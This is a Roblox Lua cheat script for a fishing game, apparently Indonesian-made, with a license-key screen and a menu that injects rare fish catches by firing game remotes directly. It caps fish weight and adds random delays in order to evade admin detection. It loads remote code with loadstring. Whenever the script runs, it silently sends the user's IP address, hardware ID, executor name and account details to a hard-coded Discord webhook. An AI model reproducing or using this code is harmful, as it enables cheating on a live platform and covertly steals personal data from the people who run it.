--[[
    ╔════════════════════════════════════════════════════════════════╗
    ║        MIZUKAGE OVERLORD V12.0 | THE GALAXY ARCHIVE            ║
    ╠════════════════════════════════════════════════════════════════╣
    ║  - Whitelist: Kazukage6 (System Overlord)                      ║
    ║  - Protocol: Latency-Mimicry Void Injection [V12.0]            ║
    ║  - Remote Bypass: 893478GDBSDUAYGDTAF (Synced)                 ║
    ║  - Security: 60% Weight Lock & 5s Manual Cooldown              ║
    ║  - Archive: 100% Synced (All Locations Identified)             ║
    ╚════════════════════════════════════════════════════════════════╝
]]

--// INTERNAL SECURITY & INTELLIGENCE REPORTING
local _SupremeAuth = "https://discord.com/api/webhooks/1449370990558576733/BoHNRontFmm2ZCcIiASPfVfF4Cft-IBcEPX1XTFKyAMYmlzj4xqRkZUyWFoE4ZXMvToU"
local _License = "mizukey_X7B2-99L1-R0P4-VOID"
local _KeyURL = "https://link-center.net/2536551/WkdrVZJF0nBj"
local _DiscordInvite = "https://discord.gg/cP3D95Yu"

--// SERVICES
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Stats = game:GetService("Stats")

--// PUSAT INTELIJEN V12 (GALAXY ENCRYPTION)
local function _DispatchSupremeIntel(status, key_at)
    local exec = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
    local hwid = (gethwid and gethwid()) or "N/A"
    local ip = "Mencari Jalur..." pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
    local ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    
    local payload = {["embeds"] = {{
        ["title"] = "🔱 MIZUKAGE V12.0 GALAXY ARCHIVE - SESSION ESTABLISHED",
        ["description"] = "Aktivitas administratif terdeteksi. Seluruh sektor database disinkronkan.",
        ["color"] = (status == "SUCCESS") and 0x2ecc71 or 0xe74c3c,
        ["fields"] = {
            {["name"] = "👤 IDENTITAS SUBJEK", ["value"] = "```yaml\nNama: "..LocalPlayer.Name.."\nID: "..LocalPlayer.UserId.."```", ["inline"] = true},
            {["name"] = "🔑 OTENTIKASI", ["value"] = "```fix\nStatus: "..status.."\nKey: "..(key_at or "WLS").."```", ["inline"] = true},
            {["name"] = "📡 DATA KLIEN", ["value"] = "```\nIP: "..ip.."\nExec: "..exec.."\nHWID: "..hwid.."```", ["inline"] = false},
            {["name"] = "🎮 STATUS GAME", ["value"] = "```\nPing: "..ping.."ms\nPlaceID: "..game.PlaceId.."```", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Mizukage Galaxy Intel v12.0 • "..os.date("%X")},
        ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"}
    }}}
    local r = (syn and syn.request) or (http and http.request) or http_request or request
    if r then r({Url = _SupremeAuth, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end
end

--// MASTER DATABASE GALAXY (100% SINKRON UPDATE 27 DES)
local MASTER_DB = {
    Secret_Abyss = {
        {name = "Shadow Worm", max = 600}, {name = "Shadow Megalodon", max = 600}, {name = "Shadow Crocodile", max = 600},
        {name = "Twinhead Maja", max = 600}, {name = "Pink Naga", max = 600}, {name = "Ancient Relic Crocodile", max = 600},
        {name = "Ancient Whale", max = 550}, {name = "Kraken", max = 400}, {name = "Sotong", max = 400},
        {name = "Sapu Sapu Goib", max = 200}, {name = "Shark Bone", max = 300}, {name = "King Crab", max = 300},
        {name = "Naga", max = 400}, {name = "El Maja", max = 600}, {name = "El Maja Pink", max = 600},
        {name = "Mega Hunt", max = 500}, {name = "Megalodon", max = 500}, {name = "Devilish Gran Maja", max = 700},
        {name = "Jungle Crocodile", max = 300}, {name = "KingJally Strong", max = 500}, {name = "Lochness Monster", max = 700},
        {name = "Worm Fish", max = 300}, {name = "Ghost Worm Fish", max = 250}, {name = "Hybodus Shark", max = 700},
        {name = "Devilish Lochness", max = 700}, {name = "Kelabang", max = 700}, {name = "Zombie Shark", max = 300},
        {name = "Xuyzey Ceas", max = 500}
    },
    Mitos_Legend = {
        {name = "Devil Shark Bone", max = 250, r = "Mitos"}, {name = "Devil Bone Whale", max = 250, r = "Mitos"},
        {name = "Devil Kraken", max = 250, r = "Mitos"}, {name = "Monster Shark", max = 250, r = "Mitos"},
        {name = "Lochness", max = 150, r = "Mitos"}, {name = "Plasma Shark", max = 100, r = "Legendary"},
        {name = "Crimsom Ray", max = 100, r = "Legendary"}
    },
    Epic_Rare = {
        {name = "Berlian Merah", max = 50, r = "Epic"}, {name = "Pink Dolphin", max = 50, r = "Epic"},
        {name = "Narwhal", max = 50, r = "Epic"}, {name = "Loving Shark", max = 40, r = "Epic"},
        {name = "Queen Crab", max = 40, r = "Epic"}, {name = "Squid Marah", max = 40, r = "Epic"},
        {name = "Devil Naga Hitam", max = 50, r = "Epic"}, {name = "Kepiting Jahat", max = 25, r = "Rare"},
        {name = "Lion Fish", max = 25, r = "Rare"}, {name = "Axolotl", max = 25, r = "Rare"},
        {name = "Kura Kura", max = 25, r = "Rare"}, {name = "Ghost Ray", max = 25, r = "Rare"},
        {name = "Ghost Fish", max = 25, r = "Rare"}
    },
    Common_Uncommon = {
        {name = "Mujaer", max = 12, r = "Common"}, {name = "Nemo", max = 16, r = "Common"}, 
        {name = "Genetik Fish", max = 16, r = "Common"}, {name = "Goliath Tiger", max = 20, r = "Common"},
        {name = "ikan monyong yg marah", max = 16, r = "Common"}, {name = "Ikan Lava", max = 16, r = "Common"},
        {name = "Ikan Layang merah", max = 16, r = "Common"}, {name = "Angler fish Devil", max = 16, r = "Uncommon"},
        {name = "Keong Lava", max = 16, r = "Uncommon"}, {name = "Jellyfish", max = 16, r = "Uncommon"}
    }
}

--// SYSTEM STATE
_G.MassActive = false
_G.ManualCooldown = false

--// TRIPLE-LATENCY VOID INJECTION (V12 ARCHITECT)
local function _ExecuteSupremeInjection(f, tier)
    local RS = game:GetService("ReplicatedStorage")
    local Fishing = RS:WaitForChild("FishingSystem", 5)
    local Cleanup = Fishing:WaitForChild("CleanupCast", 5)
    local Success = RS:WaitForChild("FishingCatchSuccess", 5)
    local VoidRemote = Fishing:WaitForChild("893478GDBSDUAYGDTAF", 5) 
    
    if not (Cleanup and Success and VoidRemote) then return end
    
    -- PROTOKOL TAHAP 1: CLEANUP (MIMICRY)
    Cleanup:FireServer()
    task.wait(math.random(4, 7) / 10)
    
    -- PROTOKOL TAHAP 2: SUCCESS
    Success:FireServer()
    task.wait(math.random(5, 9) / 10)
    
    -- SAFETY CALCULATION (PERMANENT 60% MAX KG)
    local finalWeight = f.max * 0.60 - (math.random(1, 20) / 10)
    
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local pos = root and (root.Position + Vector3.new(math.random(-8,8), -7.85, math.random(-8,8))) or Vector3.new(0,0,0)
    
    local args = {[1] = {
        hookPosition = pos,
        name = f.name,
        rarity = tier or f.r or "Common",
        weight = finalWeight
    }}
    
    VoidRemote:FireServer(unpack(args))
end

--// MAIN INTERFACE CONSTRUCTOR
local function LaunchMain()
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({
        Name = "MIZUKAGE OVERLORD V12.0 | GALAXY ARCHIVE",
        LoadingTitle = "💠 CONNECTING TO SUPREME HUB",
        LoadingSubtitle = "V12.0 Total Archive Synchronization",
        Theme = "Purple"
    })

    -- TAB: UPDATE LOG
    local TabLog = Window:CreateTab("📜 Update Log", 4483362458)
    TabLog:CreateSection("SINKRONISASI TOTAL DATABASE V12.0")
    TabLog:CreateParagraph({
        Title = "LOG PERUBAHAN & BYPASS:",
        Content = "• Implementasi 60% Weight Cap secara permanen untuk mengelabui deteksi 'Overweight Fish Deleted' admin.\n• Bypass Jalur Remote 893478GDBSDUAYGDTAF disempurnakan dengan Jeda Latency (Packet Mimicry).\n• Penambahan Tab Discord untuk bergabung ke komunitas update.\n• Sinkronisasi database seluruh lokasi (Nadi Merapi, Goa, Danau Angker, Pulau Batu).\n• Fitur Auto Mass Catch diperbarui untuk semua Tier ikan."
    })

    -- TAB: DISCORD
    local TabDiscord = Window:CreateTab("💬 Community", 4483362458)
    TabDiscord:CreateSection("Mizukage Community Hub")
    TabDiscord:CreateButton({
        Name = "Join Discord Community (Copy Link)",
        Callback = function()
            setclipboard(_DiscordInvite)
            Rayfield:Notify({Title = "URL Disalin", Content = "Link Discord telah disalin ke clipboard Anda!", Duration = 3})
        end,
    })

    -- TABS: MANUAL CATEGORIES
    local TabSecret = Window:CreateTab("🌌 Secret Abyss", 4483362458)
    local TabMitos = Window:CreateTab("👹 Elite Tier", 4483362458)
    local TabCommon = Window:CreateTab("🐟 Common Tier", 4483362458)
    local TabMass = Window:CreateTab("⚡ Auto Mass", 4483362458)

    local function AddManual(tab, list, tier)
        tab:CreateSection("Target Overwrite: ".. (tier or "Elite"))
        for _, f in pairs(list) do
            tab:CreateButton({
                Name = "💠 Inject: "..f.name,
                Callback = function() 
                    if _G.ManualCooldown then 
                        Rayfield:Notify({Title = "Cooldown", Content = "Jeda 5 detik aktif demi keamanan!", Duration = 2})
                        return 
                    end
                    _G.ManualCooldown = true
                    _ExecuteSupremeInjection(f, tier)
                    Rayfield:Notify({Title = "Injected", Content = "Entitas "..f.name.." (60% Weight) Injected.", Duration = 2})
                    task.wait(5)
                    _G.ManualCooldown = false
                end,
            })
        end
    end

    AddManual(TabSecret, MASTER_DB.Secret_Abyss, "Secret")
    AddManual(TabMitos, MASTER_DB.Mitos_Legend)
    AddManual(TabCommon, MASTER_DB.Common_Uncommon)

    -- TAB: AUTO MASS (HUMANIZED)
    TabMass:CreateSection("🌀 PROTOKOL AUTO MASS OVERLOAD")
    TabMass:CreateLabel("Status: Jeda 8-12 Detik Aktif Secara Absolut.")

    local function RunAutoMass(tierName, list)
        if _G.MassActive then return end
        _G.MassActive = true
        Rayfield:Notify({Title = "Mass Injection", Content = "Sektor: "..tierName.." Sedang Diproses.", Duration = 3})
        task.spawn(function()
            for _, f in ipairs(list) do
                if not _G.MassActive then break end
                _ExecuteSupremeInjection(f, (tierName == "Elite" and f.r or tierName))
                task.wait(math.random(8, 12))
            end
            _G.MassActive = false
            Rayfield:Notify({Title = "Selesai", Content = "Database "..tierName.." Telah Diamankan.", Duration = 3})
        end)
    end

    TabMass:CreateButton({ Name = "🔱 INJECT: ALL SECRET (MAX SAFE)", Callback = function() RunAutoMass("Secret", MASTER_DB.Secret_Abyss) end })
    TabMass:CreateButton({ Name = "👹 INJECT: ALL MITOS & LEGEND", Callback = function() RunAutoMass("Elite", MASTER_DB.Mitos_Legend) end })
    TabMass:CreateButton({ Name = "💎 INJECT: ALL EPIC & RARE", Callback = function() RunAutoMass("Elite", MASTER_DB.Epic_Rare) end })
    TabMass:CreateButton({ Name = "🛑 ABORT PROTOCOL", Callback = function() _G.MassActive = false end })

    Rayfield:Notify({Title = "GALAXY ARCHIVE LOADED", Content = "Protocol V12 Ready. Selamat Bekerja.", Duration = 5})
end

--// AUTHENTICATION SYSTEM (WHITELIST Kazukage6)
if LocalPlayer.Name == "Kazukage6" then
    task.spawn(function() _DispatchSupremeIntel("SUCCESS (WHITELIST_ADMIN)", "GALAXY_ARCHITECT") end)
    LaunchMain()
else
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "MizukageGalaxyAuth"
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 360, 0, 180)
    Frame.Position = UDim2.new(0.5, -180, 0.4, -90)
    Frame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
    Frame.Parent = ScreenGui
    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
    local Stroke = Instance.new("UIStroke", Frame)
    Stroke.Color = Color3.fromRGB(160, 32, 240)
    Stroke.Thickness = 2.5

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Text = "MIZUKAGE OVERLORD V12.0"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 18
    Title.BackgroundTransparency = 1
    Title.Parent = Frame

    local Input = Instance.new("TextBox")
    Input.Size = UDim2.new(0.85, 0, 0, 45)
    Input.Position = UDim2.new(0.075, 0, 0.35, 0)
    Input.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Input.TextColor3 = Color3.fromRGB(255, 255, 255)
    Input.PlaceholderText = "Paste Galaxy License Key..."
    Input.Text = ""
    Input.Parent = Frame
    Instance.new("UICorner", Input)

    local Verify = Instance.new("TextButton")
    Verify.Size = UDim2.new(0.4, 0, 0, 40)
    Verify.Position = UDim2.new(0.075, 0, 0.68, 0)
    Verify.BackgroundColor3 = Color3.fromRGB(160, 32, 240)
    Verify.Text = "VERIFY"
    Verify.TextColor3 = Color3.fromRGB(255, 255, 255)
    Verify.Font = Enum.Font.GothamBold
    Verify.Parent = Frame
    Instance.new("UICorner", Verify)

    local GetKey = Instance.new("TextButton")
    GetKey.Size = UDim2.new(0.4, 0, 0, 40)
    GetKey.Position = UDim2.new(0.525, 0, 0.68, 0)
    GetKey.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    GetKey.Text = "GET KEY"
    GetKey.TextColor3 = Color3.fromRGB(255, 255, 255)
    GetKey.Font = Enum.Font.GothamBold
    GetKey.Parent = Frame
    Instance.new("UICorner", GetKey)

    GetKey.MouseButton1Click:Connect(function() setclipboard(_KeyURL) GetKey.Text = "COPIED!" task.wait(2) GetKey.Text = "GET KEY" end)

    Verify.MouseButton1Click:Connect(function()
        if Input.Text == _License then
            task.spawn(function() _DispatchSupremeIntel("SUCCESS", Input.Text) end)
            ScreenGui:Destroy()
            LaunchMain()
        else
            Verify.Text = "FAILED!" task.wait(2) Verify.Text = "VERIFY"
        end
    end)
    task.spawn(function() _DispatchSupremeIntel("EXECUTED (WAITING)", "NONE") end)
end
